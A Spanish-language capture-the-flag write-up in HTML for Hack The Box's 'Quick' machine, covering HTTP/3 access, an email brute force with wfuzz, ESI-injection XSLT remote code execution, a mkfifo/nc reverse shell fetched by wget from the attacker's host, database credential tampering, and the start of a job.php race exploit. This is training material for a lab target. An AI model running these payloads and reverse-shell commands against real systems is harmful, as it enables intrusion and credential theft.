-&lt;h2 id=&quot;explotación&quot;&gt;Explotación &lt;a href=&quot;#explotación&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Utilizaremos &lt;code&gt;whatweb&lt;/code&gt; para identificar las tecnoligias que emplea el servicio web de la maquina en el puerto &lt;code&gt;9001&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ whatweb http://10.10.10.186:9001
-http://10.10.10.186:9001 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.186], Script, Title[Quick | Broadband Services], Via-Proxy[1.1 localhost (Apache-HttpClient/4.5.2 (cache))], X-Powered-By[Esigate]
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Vemos que el servicio corresponde a un &lt;code&gt;Esigate&lt;/code&gt;.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Esigate: ESIGate permite una integración transparente y eficiente entre todas las aplicaciones Web. Por ejemplo, agregue a un CMS (Sistema de gestión de contenidos) módulos desarrollados en cualquier lenguaje (PHP, Java, . Net…) sin problemas de caché o de accesibilidad.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;Abrimos el servicio en el navegador y vemos un mensaje &lt;code&gt;update&lt;/code&gt;, donde nos comenta que se esta utilizando la ultima versión de &lt;code&gt;http&lt;/code&gt;, que corresponde a &lt;code&gt;http3&lt;/code&gt;, ademas tambien podemos ver una lista de usuarios.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Quick/quick1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Si vamos al enlace de &lt;code&gt;clientes&lt;/code&gt;, obtenemos mas información de los usuarios como la empresa y pais a la cual pertenecen.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Quick/quick2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Volviendo a la pagina principal, haciendo hovering en &lt;code&gt;portal&lt;/code&gt; obtenemos que se nos redirige a otro subdominio, el cual añadiremos a nuestro &lt;code&gt;/etc/hosts&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ echo &quot;10.10.10.186 quick.htb portal.quick.htb&quot; &amp;gt;&amp;gt; /etc/hosts
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Vemos que no podemos visualizar la pagina, aun agregando los subdominios.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Quick/quick3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Investigando un poco del &lt;code&gt;http3&lt;/code&gt;, vemos que la nueva versión de &lt;code&gt;http3&lt;/code&gt; sera la que deje de usar el protocolo &lt;code&gt;TCP&lt;/code&gt; y lo reemplazara por uno nuevo de nombre &lt;code&gt;Quick&lt;/code&gt;. Curiosamente similar al nombre de la maquina.&lt;/p&gt;
-
-&lt;p&gt;Puedes ver mas detalles en el siguiente articulo.&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://www.xataka.com/basics/http-3-que-donde-viene-que-que-cambia-para-buscar-internet-rapido&quot;&gt;https://www.xataka.com/basics/http-3-que-donde-viene-que-que-cambia-para-buscar-internet-rapido&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Para poder usar esta versión experimental, vamos a recompilar una versión de &lt;code&gt;curl&lt;/code&gt;, del siguiente repositorio:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://github.com/curl/curl/blob/master/docs/HTTP3.md#quiche-version&quot;&gt;https://github.com/curl/curl/blob/master/docs/HTTP3.md#quiche-version&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Para efectos practicos ejecutando los siguientes comandos podremos obtener el binario funcional.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Quick/quick4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Una vez lo tengamos correctamente instalado, ejecutamos y esta vez si podemos ver la pagina, la cual nos expone algunas rutas.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;
-❯ ./src/.libs/curl -s --http3 &quot;https://portal.quick.htb/&quot; -k
-&amp;lt;html&amp;gt;
-  &amp;lt;ul&amp;gt;
-    &amp;lt;li&amp;gt;&amp;lt;a href=&quot;index.php&quot;&amp;gt;Home&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;
-    &amp;lt;li&amp;gt;&amp;lt;a href=&quot;index.php?view=contact&quot;&amp;gt;Contact&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;
-    &amp;lt;li&amp;gt;&amp;lt;a href=&quot;index.php?view=about&quot;&amp;gt;About&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;
-    &amp;lt;li&amp;gt;&amp;lt;a href=&quot;index.php?view=docs&quot;&amp;gt;References&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;
-  &amp;lt;/ul&amp;gt;
-&amp;lt;/html&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Encontramos nuevos usuarios en la ruta &lt;code&gt;about&lt;/code&gt; y usamos &lt;code&gt;html2text&lt;/code&gt; para moestrarlo estetico en consola.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ./src/.libs/curl -s --http3 &quot;https://portal.quick.htb/?view=about&quot; -k | html2text
-****** Quick | About Us ******
-***** Our Team *****
-[Jane]
-***** Jane Doe *****
-CEO &amp;amp; Founder
-Quick Broadband services established in 2012 by Jane.
-jane@quick.htb
-[Mike]
-***** Mike Ross *****
-Sales Manager
-Manages the sales and services.
-mike@quick.htb
-[John]
-***** John Doe *****
-Web Designer
-Front end developer.
-john@quick.htb
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Encontramos un &lt;code&gt;pdf&lt;/code&gt;, donde podemos obtener una contraseña &lt;code&gt;Quick4cc3$$&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;./src/.libs/curl --http3 &quot;https://portal.quick.htb/docs/QuickStart.pdf&quot; -k --output QuickStart.pdf
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Quick/quick5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Nos dirigimos al panel principal y vamos al enlace &lt;code&gt;Get Started&lt;/code&gt;, que nos redirige a un panel de logeo.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Quick/quick6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Contamos con una contraseña, pero recordemos que anteriormente obtuvimos una lista de usuarios. Como el panel de logeo nos pide un email valido, vamos a crearnos un diccionario con los usuarios que obtuvimos, y ya que tambien se nos filtro la compañia y pais de origen de cada uno, podemos computar posibles correos a partir de estos datos.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ cat users.txt
-tim@qconsulting.co.uk
-tim@qconsulting.co
-tim@qconsulting.uk
-tim@qconsulting.com
-tim@quick.htb
-roy@darkwng.us
-roy@quick.htb
-roy@darkwng.com
-elisa@wink.uk
-elisa@wink.co.uk
-elisa@quick.htb
-elisa@wink.com
-james@lazycoop.cn
-james@lazycoop.com
-james@quick.htb
-mike@quick.htb
-jane@quick.htb
-jhon@quick.htb
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Ahora mediante fuerza bruta trataremos de encontrar una credencial valida, para ello usaremos &lt;code&gt;wfuzz&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ wfuzz -c --hc=404 -t 50 -w $(pwd)/users.txt -d 'email=FUZZ&amp;amp;password=Quick4cc3$$' &quot;http://10.10.10.186:9001/login.php&quot;
- /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
-********************************************************
-* Wfuzz 3.1.0 - The Web Fuzzer                         *
-********************************************************
-
-Target: http://10.10.10.186:9001/login.php
-Total requests: 18
-
-=====================================================================
-ID           Response   Lines    Word       Chars       Payload                                                                                                               
-=====================================================================
-
-000000003:   200        0 L      2 W        80 Ch       &quot;tim@qconsulting.uk&quot;                                                                                                  
-000000007:   200        0 L      2 W        80 Ch       &quot;roy@quick.htb&quot;                                                                                                       
-000000015:   200        0 L      2 W        80 Ch       &quot;james@quick.htb&quot;                                                                                                     
-000000014:   200        0 L      2 W        80 Ch       &quot;james@lazycoop.com&quot;                                                                                                  
-000000001:   200        0 L      2 W        80 Ch       &quot;tim@qconsulting.co.uk&quot;                                                                                               
-000000012:   200        0 L      2 W        80 Ch       &quot;elisa@wink.com&quot;                                                                                                      
-000000016:   200        0 L      2 W        80 Ch       &quot;mike@quick.htb&quot;                                                                                                      
-000000013:   200        0 L      2 W        80 Ch       &quot;james@lazycoop.cn&quot;                                                                                                   
-000000018:   200        0 L      2 W        80 Ch       &quot;jhon@quick.htb&quot;                                                                                                      
-000000017:   200        0 L      2 W        80 Ch       &quot;jane@quick.htb&quot;                                                                                                      
-000000006:   200        0 L      2 W        80 Ch       &quot;roy@darkwng.us&quot;                                                                                                      
-000000010:   302        0 L      0 W        0 Ch        &quot;elisa@wink.co.uk&quot;                                                                                                    
-000000011:   200        0 L      2 W        80 Ch       &quot;elisa@quick.htb&quot;                                                                                                     
-000000009:   200        0 L      2 W        80 Ch       &quot;elisa@wink.uk&quot;                                                                                                       
-000000002:   200        0 L      2 W        80 Ch       &quot;tim@qconsulting.co&quot;                                                                                                  
-000000005:   200        0 L      2 W        80 Ch       &quot;tim@quick.htb&quot;                                                                                                       
-000000008:   200        0 L      2 W        80 Ch       &quot;roy@darkwng.com&quot;                                                                                                     
-000000004:   200        0 L      2 W        80 Ch       &quot;tim@qconsulting.com&quot;                                                                                                 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Vemos que uno nos reporta un codigo de estado &lt;code&gt;302&lt;/code&gt;, validamos las credenciales y ganamos acceso a un panel de generación de &lt;code&gt;tickets&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Quick/quick7.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Anteriormente vimos que el servicio web, usaba &lt;code&gt;esigate&lt;/code&gt; y buscando vulnerabilidades asociadas encontramos que podemos hace una inyección para obtener &lt;code&gt;RCE a traves de XSLT&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Dejo el siguiente articulo si quieres saber a detalle en que consiste la vulnerabilidad y su explotación paso a paso.&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/&quot;&gt;https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Para explotar vamos a crear dos archivo con extension &lt;code&gt;xml y xsl&lt;/code&gt;, con el mismo contenido, donde en la opción &lt;code&gt;CDATA&lt;/code&gt; inyectaremos el codigo que queremos ejecutar.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-xml&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; ?&amp;gt;
-&amp;lt;xsl:stylesheet version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;&amp;gt;
-&amp;lt;xsl:output method=&quot;xml&quot; omit-xml-declaration=&quot;yes&quot;/&amp;gt;
-&amp;lt;xsl:template match=&quot;/&quot;
-xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;
-xmlns:rt=&quot;http://xml.apache.org/xalan/java/java.lang.Runtime&quot;&amp;gt;
-&amp;lt;root&amp;gt;
-&amp;lt;xsl:variable name=&quot;cmd&quot;&amp;gt;&amp;lt;![CDATA[wget http://10.10.16.4/shell]]&amp;gt;&amp;lt;/xsl:variable&amp;gt;
-&amp;lt;xsl:variable name=&quot;rtObj&quot; select=&quot;rt:getRuntime()&quot;/&amp;gt;
-&amp;lt;xsl:variable name=&quot;process&quot; select=&quot;rt:exec($rtObj, $cmd)&quot;/&amp;gt;
-Process: &amp;lt;xsl:value-of select=&quot;$process&quot;/&amp;gt;
-Command: &amp;lt;xsl:value-of select=&quot;$cmd&quot;/&amp;gt;
-&amp;lt;/root&amp;gt;
-&amp;lt;/xsl:template&amp;gt;
-&amp;lt;/xsl:stylesheet&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Asi mismo como vamos a hacer una petición a un archivo de nuestra maquina de nombre &lt;code&gt;shell&lt;/code&gt;, vamos a introducir dentro de este un codigo en bash que nos permita obtener una rever shell.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ cat shell
-#!/bin/bash
-
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.0.0.1 1234 &amp;gt;/tmp/f
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Lo siguiente sera ejecutar el siguiente codigo en la opción de &lt;code&gt;raise ticket&lt;/code&gt;, donde realizaremos una petición a los archivos previamente creados.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-xml&quot;&gt;&amp;lt;esi:include src=&quot;http://10.10.16.4/a.xml&quot; stylesheet=&quot;http://10.10.16.4/a.xsl&quot;&amp;gt;
-&amp;lt;/esi:include&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Quick/quick13.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Se nos generara un codigo de ticket.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Quick/quick8.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Buscamos el ticket en la ruta &lt;code&gt;search.php&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Quick/quick9.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Y en consecuencia recibimos la petición, que indica que se subio nuestro archivo &lt;code&gt;shell&lt;/code&gt; a la maquina victima.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;❯ python3 -m http.server 80
-Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
-10.10.10.186 - - [16/Jun/2023 23:40:17] &quot;GET /a.xsl HTTP/1.1&quot; 200 -
-10.10.10.186 - - [16/Jun/2023 23:40:17] &quot;GET /a.xml HTTP/1.1&quot; 200 -
-10.10.10.186 - - [16/Jun/2023 23:40:18] &quot;GET /shell HTTP/1.1&quot; 200 -
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Ahora debemos hacer el mismo proceso, pero esta vez modificaremos nuestros archivos con el comando inyectado en &lt;code&gt;CDATA&lt;/code&gt; por &lt;code&gt;bash shell&lt;/code&gt;, para que se ejecute nuestro archivo.&lt;/p&gt;
-
-&lt;p&gt;Para evitar problemas en esta segunda petición modifiquemos el nombre de los archivos &lt;code&gt;xml y xsl&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-xml&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; ?&amp;gt;
-&amp;lt;xsl:stylesheet version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;&amp;gt;
-&amp;lt;xsl:output method=&quot;xml&quot; omit-xml-declaration=&quot;yes&quot;/&amp;gt;
-&amp;lt;xsl:template match=&quot;/&quot;
-xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;
-xmlns:rt=&quot;http://xml.apache.org/xalan/java/java.lang.Runtime&quot;&amp;gt;
-&amp;lt;root&amp;gt;
-  &amp;lt;xsl:variable name=&quot;cmd&quot;&amp;gt;&amp;lt;![CDATA[bash shell]]&amp;gt;&amp;lt;/xsl:variable&amp;gt;
-&amp;lt;xsl:variable name=&quot;rtObj&quot; select=&quot;rt:getRuntime()&quot;/&amp;gt;
-&amp;lt;xsl:variable name=&quot;process&quot; select=&quot;rt:exec($rtObj, $cmd)&quot;/&amp;gt;
-Process: &amp;lt;xsl:value-of select=&quot;$process&quot;/&amp;gt;
-Command: &amp;lt;xsl:value-of select=&quot;$cmd&quot;/&amp;gt;
-&amp;lt;/root&amp;gt;
-&amp;lt;/xsl:template&amp;gt;
-&amp;lt;/xsl:stylesheet&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Realizamos la misma ejecución.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Quick/quick12.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Quick/quick11.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Nos genera otro nuevo ticket que al buscarlo nuevamente en la ruta &lt;code&gt;search.php&lt;/code&gt;, ejecuta el archivo dandonos acceso al sistema como el usuario &lt;code&gt;sam&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python3 -m http.server 80
-Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
-10.10.10.186 - - [17/Jun/2023 00:04:41] &quot;GET /c.xsl HTTP/1.1&quot; 200 -
-10.10.10.186 - - [17/Jun/2023 00:04:42] &quot;GET /c.xml HTTP/1.1&quot; 200 -
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ncat -nlvp 443
-Ncat: Version 7.92 ( https://nmap.org/ncat )
-Ncat: Listening on :::443
-Ncat: Listening on 0.0.0.0:443
-Ncat: Connection from 10.10.10.186.
-Ncat: Connection from 10.10.10.186:38672.
-/bin/sh: 0: can't access tty; job control turned off
-$ whoami
-sam
-$ 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Como es de costumbre, ahora ganaremos acceso con una &lt;code&gt;tty full interactive&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;$ script /dev/null -c bash
-Script started, file is /dev/null
-sam@quick:~$ ^Z
-zsh: suspended  ncat -nlvp 443
-❯ stty raw -echo; fg
-[1]  + continued  ncat -nlvp 443
-                                reset xterm
-sam@quick:~$ export TERM=xterm
-sam@quick:~$ export SHELL=bash
-sam@quick:~$ stty rows 45 columns 184
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Nos dirigimos al directorio personal del usuario &lt;code&gt;sam&lt;/code&gt; y visualizamos la primera flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sam@quick:~$ ls
-esigate-distribution-5.2  shell  user.txt
-sam@quick:~$ cat user.txt 
-359179c57000cd4aa582740c4a637cc6
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Ya que el servicio corre en un &lt;code&gt;apache&lt;/code&gt;, visualizamos el archivo de configuración y encontramos un nuevo subdominio &lt;code&gt;printerv2.quick.htb&lt;/code&gt;, correspondiente a otro panel de logeo.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sam@quick:~$ 2cat /etc/apache2/sites-enabled/000-default.conf 
-&amp;lt;VirtualHost *:80&amp;gt;
-	# The ServerName directive sets the request scheme, hostname and port that
-	# the server uses to identify itself. This is used when creating
-	# redirection URLs. In the context of virtual hosts, the ServerName
-	# specifies what hostname must appear in the request's Host: header to
-	# match this virtual host. For the default virtual host (this file) this
-	# value is not decisive as it is used as a last resort host regardless.
-	# However, you must set it for any further virtual host explicitly.
-	#ServerName www.example.com
-
-	ServerAdmin webmaster@localhost
-	DocumentRoot /var/www/html
-
-	# Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
-	# error, crit, alert, emerg.
-	# It is also possible to configure the loglevel for particular
-	# modules, e.g.
-	#LogLevel info ssl:warn
-
-	ErrorLog ${APACHE_LOG_DIR}/error.log
-	CustomLog ${APACHE_LOG_DIR}/access.log combined
-
-	# For most configuration files from conf-available/, which are
-	# enabled or disabled at a global level, it is possible to
-	# include a line for only one particular virtual host. For example the
-	# following line enables the CGI configuration for this host only
-	# after it has been globally disabled with &quot;a2disconf&quot;.
-	#Include conf-available/serve-cgi-bin.conf
-&amp;lt;/VirtualHost&amp;gt;
-&amp;lt;VirtualHost *:80&amp;gt;
-	AssignUserId srvadm srvadm
-	ServerName printerv2.quick.htb
-	DocumentRoot /var/www/printer
-&amp;lt;/VirtualHost&amp;gt;
-# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Procemos a añadir el nuevo subdominio a nuestro &lt;code&gt;/etc/hosts&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ echo &quot;10.10.10.186 printerv2.quick.htb&quot; &amp;gt;&amp;gt; /etc/hosts
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Quick/quick14.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Enumerando el sistema, encontramos un archivo con las credenciales de la base de datos.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sam@quick:/var/www/html$ ls
-clients.php  db.php  home.php  index.php  login.php  search.php  ticket.php
-sam@quick:/var/www/html$ cat db.php 
-&amp;lt;?php
-$conn = new mysqli(&quot;localhost&quot;,&quot;db_adm&quot;,&quot;db_p4ss&quot;,&quot;quick&quot;);
-?&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Procemos a enumerar la base de datos y vemos las contraseñas hasheadas de los usuarios.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;sam@quick:/var/www/html$ mysql -udb_adm -pdb_p4ss -D quick
-mysql: [Warning] Using a password on the command line interface can be insecure.
-Reading table information for completion of table and column names
-You can turn off this feature to get a quicker startup with -A
-
-Welcome to the MySQL monitor.  Commands end with ; or \g.
-Your MySQL connection id is 128
-Server version: 5.7.29-0ubuntu0.18.04.1 (Ubuntu)
-
-Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.
-
-Oracle is a registered trademark of Oracle Corporation and/or its
-affiliates. Other names may be trademarks of their respective
-owners.
-
-Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
-
-mysql&amp;gt; show tables;
-+-----------------+
-| Tables_in_quick |
-+-----------------+
-| jobs            |
-| tickets         |
-| users           |
-+-----------------+
-3 rows in set (0.00 sec)
-
-mysql&amp;gt; describe users;
-+----------+---------------+------+-----+---------+-------+
-| Field    | Type          | Null | Key | Default | Extra |
-+----------+---------------+------+-----+---------+-------+
-| name     | varchar(100)  | YES  |     | NULL    |       |
-| email    | varchar(100)  | YES  |     | NULL    |       |
-| password | varchar(1000) | YES  |     | NULL    |       |
-+----------+---------------+------+-----+---------+-------+
-3 rows in set (0.00 sec)
-
-mysql&amp;gt; select email, password from users;
-+------------------+----------------------------------+
-| email            | password                         |
-+------------------+----------------------------------+
-| elisa@wink.co.uk | c6c35ae1f3cb19438e0199cfa72a9d9d |
-| srvadm@quick.htb | e626d51f8fbfd1124fdea88396c35d05 |
-+------------------+----------------------------------+
-2 rows in set (0.00 sec)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Probamos a tratar de crackear los hashes pero no nos resulta posible, pero debemos recordar que al ser el usuario &lt;code&gt;db_adm&lt;/code&gt;, podemos tener algunos privilegios entre ellos el de modificar las credenciales.&lt;/p&gt;
-
-&lt;p&gt;Para ello como ya contamos con la password de &lt;code&gt;elisa&lt;/code&gt;, vamos a modificar a tratar de modificar la password del usuario &lt;code&gt;srvadm&lt;/code&gt;, de tal modo que sea la misma.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;mysql&amp;gt; update users set password=&quot;c6c35ae1f3cb19438e0199cfa72a9d9d&quot; where email=&quot;srvadm@quick.htb&quot;;
-Query OK, 1 row affected (0.00 sec)
-Rows matched: 1  Changed: 1  Warnings: 0
-
-mysql&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Nos conectamos exitosamente con las nuevas credenciales &lt;code&gt;srvadm@quick.htb:Quick4cc3$$&lt;/code&gt; y ganamos acceso a una aplicación de impresoras.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Quick/quick15.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;Escalada de Privilegios &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Si seleccionamos la opción &lt;code&gt;add printer&lt;/code&gt;, vemos que se establece una conexión al puerto &lt;code&gt;9100&lt;/code&gt; y si ingresamos nuestra ip, recibimos una conexión al imprimir.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Quick/quick16.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ncat -nlvp 9100
-Ncat: Version 7.92 ( https://nmap.org/ncat )
-Ncat: Listening on :::9100
-Ncat: Listening on 0.0.0.0:9100
-Ncat: Connection from 10.10.10.186.
-Ncat: Connection from 10.10.10.186:44216.
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Al continuar enumerando el sistema, encontramos un archivo de nombre &lt;code&gt;job.php&lt;/code&gt;, el cual crea un archivo con nombre de la fecha actual y lo almance en la ruta &lt;code&gt;/var/www/jobs&lt;/code&gt; con el contenido que ingresamos en &lt;code&gt;bill details&lt;/code&gt; en jobs.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Quick/quick17.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Tambien podemos observar que despues genera una conexión a una ip y puerto especifico, donde envia dicho contenido. Pero vemos algo muy interesante ya que en el proceso se ejecuta un &lt;code&gt;sleep(0.5)&lt;/code&gt; de medio segundo.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;&amp;lt;?php
-require __DIR__ . '/escpos-php/vendor/autoload.php';
-use Mike42\Escpos\PrintConnectors\NetworkPrintConnector;
-use Mike42\Escpos\Printer;
-include(&quot;db.php&quot;);
-session_start();
-
-if($_SESSION[&quot;loggedin&quot;])
-{
-	if(isset($_POST[&quot;submit&quot;]))
-	{
-		$title=$_POST[&quot;title&quot;];
-		$file = date(&quot;Y-m-d_H:i:s&quot;);
-		file_put_contents(&quot;/var/www/jobs/&quot;.$file,$_POST[&quot;desc&quot;]);
-		chmod(&quot;/var/www/printer/jobs/&quot;.$file,&quot;0777&quot;);
-		$stmt=$conn-&amp;gt;prepare(&quot;select ip,port from jobs&quot;);
-		$stmt-&amp;gt;execute();
-		$result=$stmt-&amp;gt;get_result();
-		if($result-&amp;gt;num_rows &amp;gt; 0)
-		{
-			$row=$result-&amp;gt;fetch_assoc();
-			$ip=$row[&quot;ip&quot;];
-			$port=$row[&quot;port&quot;];
-			try
-			{
-				$connector = new NetworkPrintConnector($ip,$port);
-				sleep(0.5); //Buffer for socket check
-				$printer = new Printer($connector);
-				$printer -&amp;gt; text(file_get_contents(&quot;/var/www/jobs/&quot;.$file));
-				$printer -&amp;gt; cut();
-				$printer -&amp;gt; close();
-				$message=&quot;Job assigned&quot;;
-				unlink(&quot;/var/www/jobs/&quot;.$file);
-			}
-			catch(Exception $error) 
-			{
-				$error=&quot;Can't connect to printer.&quot;;
-				unlink(&quot;/var/www/jobs/&quot;.$file);
-			}
-		}
-		else
-		{
-			$error=&quot;Couldn't find printer.&quot;;
-		}
-	}
-
-?&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Quick/quick18.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
